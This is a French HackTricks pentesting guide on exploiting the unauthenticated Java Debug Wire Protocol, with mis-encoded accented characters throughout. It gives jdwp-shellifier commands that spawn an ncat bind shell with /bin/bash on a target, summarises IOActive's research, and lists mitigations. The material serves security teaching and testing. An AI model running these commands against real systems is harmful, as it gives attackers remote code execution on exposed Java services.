# Pentesting JDWP - Java Debug Wire Protocol

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**Configuration instantan√©ment disponible pour l'√©valuation des vuln√©rabilit√©s et les tests d'intrusion**. R√©alisez un pentest complet depuis n'importe o√π avec plus de 20 outils et fonctionnalit√©s allant de la reconnaissance au reporting. Nous ne rempla√ßons pas les pentesters - nous d√©veloppons des outils personnalis√©s, des modules de d√©tection et d'exploitation pour leur redonner du temps afin d'approfondir, de lancer des shells et de s'amuser.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Exploitation

L'exploitation de JDWP repose sur le **manque d'authentification et de chiffrement du protocole**. On le trouve g√©n√©ralement sur le **port 8000**, mais d'autres ports sont possibles. La connexion initiale se fait en envoyant un "JDWP-Handshake" au port cible. Si un service JDWP est actif, il r√©pond avec la m√™me cha√Æne, confirmant sa pr√©sence. Cette poign√©e de main sert de m√©thode de fingerprinting pour identifier les services JDWP sur le r√©seau.

En termes d'identification de processus, rechercher la cha√Æne "jdwk" dans les processus Java peut indiquer une session JDWP active.

L'outil de r√©f√©rence est [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier). Vous pouvez l'utiliser avec diff√©rents param√®tres :
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
J'ai constat√© que l'utilisation de `--break-on 'java.lang.String.indexOf'` rend l'exploit plus **stable**. Et si vous avez la possibilit√© de t√©l√©charger un backdoor sur l'h√¥te et de l'ex√©cuter au lieu d'ex√©cuter une commande, l'exploit sera encore plus stable.

## Plus de d√©tails

**Ceci est un r√©sum√© de [https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)**. Consultez-le pour plus de d√©tails.

1. **Aper√ßu de JDWP** :
- C'est un protocole binaire r√©seau bas√© sur des paquets, principalement synchrone.
- Manque d'authentification et de cryptage, le rendant vuln√©rable lorsqu'il est expos√© √† des r√©seaux hostiles.

2. **Handshake JDWP** :
- Un processus de handshake simple est utilis√© pour initier la communication. Une cha√Æne ASCII de 14 caract√®res ‚ÄúJDWP-Handshake‚Äù est √©chang√©e entre le D√©bogueur (client) et le D√©bogu√© (serveur).

3. **Communication JDWP** :
- Les messages ont une structure simple avec des champs comme Longueur, Id, Drapeau et CommandSet.
- Les valeurs de CommandSet varient de 0x40 √† 0x80, repr√©sentant diff√©rentes actions et √©v√©nements.

4. **Exploitation** :
- JDWP permet de charger et d'invoquer des classes et du bytecode arbitraires, posant des risques de s√©curit√©.
- L'article d√©taille un processus d'exploitation en cinq √©tapes, impliquant la r√©cup√©ration des r√©f√©rences Java Runtime, la d√©finition de points d'arr√™t et l'invocation de m√©thodes.

5. **Exploitation dans la vie r√©elle** :
- Malgr√© les protections potentielles des pare-feu, les services JDWP sont d√©couvrables et exploitables dans des sc√©narios r√©els, comme le d√©montrent les recherches sur des plateformes comme ShodanHQ et GitHub.
- Le script d'exploit a √©t√© test√© contre diverses versions de JDK et est ind√©pendant de la plateforme, offrant une ex√©cution de code √† distance (RCE) fiable.

6. **Implications de s√©curit√©** :
- La pr√©sence de services JDWP ouverts sur Internet souligne la n√©cessit√© de r√©visions de s√©curit√© r√©guli√®res, de d√©sactivation des fonctionnalit√©s de d√©bogage en production et de configurations appropri√©es des pare-feu.

### **R√©f√©rences :**

* [[https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)]
* [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
* [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
* http://www.secdev.org/projects/scapy(no longer active)
* [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
* http://www.hsc-news.com/archives/2013/000109.html (no longer active)
* [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
* https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
* [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
* [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)

<figure><img src="/.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**Configuration instantan√©ment disponible pour l'√©valuation des vuln√©rabilit√©s et le pentesting**. Effectuez un pentest complet depuis n'importe o√π avec plus de 20 outils et fonctionnalit√©s allant de la reconnaissance √† la r√©daction de rapports. Nous ne rempla√ßons pas les pentesters - nous d√©veloppons des outils personnalis√©s, des modules de d√©tection et d'exploitation pour leur redonner du temps pour approfondir, ouvrir des shells et s'amuser.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}
